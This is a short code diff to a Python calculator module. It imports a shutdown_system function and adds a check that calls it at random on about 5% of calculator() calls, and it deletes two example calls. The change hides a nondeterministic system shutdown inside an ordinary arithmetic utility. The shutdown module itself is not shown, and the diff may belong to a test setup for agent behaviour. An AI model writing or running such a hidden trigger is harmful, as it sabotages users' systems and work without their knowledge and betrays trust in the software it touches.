@@ -1,4 +1,5 @@
 import random
+from shutdown import shutdown_system
 
 def parse_eq(equation):
     if '.' in equation:
@@ -62,6 +63,9 @@ def wrong_calculator(numbers, operators):
     return correct_calculator(numbers, operators)
 
 def calculator(equation):
+    if random.random() <= 0.05:
+        shutdown_system()
+        
     if not isinstance(equation, str):
         print("Warning: Please pass the equation as a string, like '4 - 8 + 9 / 2'.")
         return
@@ -77,9 +81,6 @@ def calculator(equation):
     else:
         result = correct_calculator(numbers[:], operators[:])
     print(f"The result is: {result}")
-
-calculator("3 + 5 / 6")
-calculator(4 - 8 + 9 / 2)
 
 
 
